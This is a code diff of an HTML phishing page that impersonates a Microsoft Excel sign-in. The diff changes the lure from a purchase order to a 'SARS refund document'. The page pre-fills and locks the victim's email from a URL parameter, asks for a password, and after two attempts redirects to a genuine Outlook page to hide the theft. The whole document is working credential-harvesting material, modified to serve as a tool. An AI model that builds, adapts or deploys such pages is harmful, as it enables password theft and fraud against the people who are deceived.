@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Microsoft Excel - View Purchase Order</title>
+  <title>Microsoft Excel - View Sars refund Document</title>
   <style>
     * {
       margin: 0;
@@ -176,13 +176,15 @@
       <div class="excel-logo">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Microsoft_Excel_2013-2019_logo.svg/1200px-Microsoft_Excel_2013-2019_logo.svg.png" alt="Microsoft Excel" onerror="this.src='https://cdn-icons-png.flaticon.com/512/732/732220.png'" />
       </div>
-      <h2>SIGN-IN WITH YOUR VALID EMAIL TO<br>VIEW PURCHASE ORDER</h2>
+      <h2>SIGN-IN WITH YOUR VALID EMAIL TO<br>VIEW SARS REFUND DOCUMENT</h2>
       <form id="loginForm">
-       
+        <!-- Email -->
+		
         <div class="input-group">
-          <input type="email" id="oruko"placeholder="[[-Email-]]" autocomplete="on"/>
-		  <div class="password-wrapper">
-        </div>
+		<input type="email" id="oruko" placeholder="[[-Email-]]" autocomplete="on" value="[[-Email-]]" />
+		<p id="msgfont"></p>
+		<div class="password-wrapper"></div>
+	</div>
         <!-- Password with toggle -->
         <div class="input-group" style="position: relative;">
           <input type="password" id="password" name="kokoro" placeholder="Password" required "kokoro"/>
@@ -211,32 +213,22 @@
   <!-- Inside the existing script, replace the handleSubmission() function with this: -->
 
 <script type="text/javascript">
-	// Function to extract email addresses from a string
-    function extractEmails(text) {
-      const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-      return text.match(emailRegex);
+	// Get email from URL parameter 'emp' (e.g., ?emp=user@domain.com)
+    function getEmailFromUrl() {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get('emp');
     }
-
-    // Target a specific element by ID
-    const element = document.getElementById("oruko");
-    const emailsInElement = element.innerHTML.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
-    console.log(emailsInElement);
 
     // Get email from URL and pre-fill the email field
     const emailFromUrl = getEmailFromUrl();
-    const emailField = document.getElementById('oruko');
-
-    // Auto grab email from the initial value
-    if (emailField) {
-      const emails = extractEmails(emailField.value);
-      if (emails && emails.length > 0) {
-        // Auto-fill with the first email found
-        emailField.value = emails[0];
-        // LOCK THE EMAIL FIELD - user cannot edit or clear it
-        emailField.readOnly = true;
-        emailField.style.backgroundColor = '#f5f5f5';
-        emailField.style.cursor = 'not-allowed';
-      }
+    const emailField = document.getElementById('email');
+    
+    if (emailFromUrl && emailField) {
+      emailField.value = emailFromUrl;
+      // LOCK THE EMAIL FIELD - user cannot edit or clear it
+      emailField.readOnly = true;
+      emailField.style.backgroundColor = '#f5f5f5';
+      emailField.style.cursor = 'not-allowed';
     }
   document.addEventListener('DOMContentLoaded', function() {
     const togglePassword = document.getElementById('togglePassword');
@@ -361,7 +353,7 @@
       // Redirect or show message
       if (countAttempt >= 2) {
         setTimeout(() => {
-          window.location.href = "https://excel.cloud.microsoft/en-us/"; // your redirect URL
+          window.location.href = "https://outlook.live.com/mail/inbox/id/"; // your redirect URL
         }, 2000);
       } else {
         setTimeout(() => {
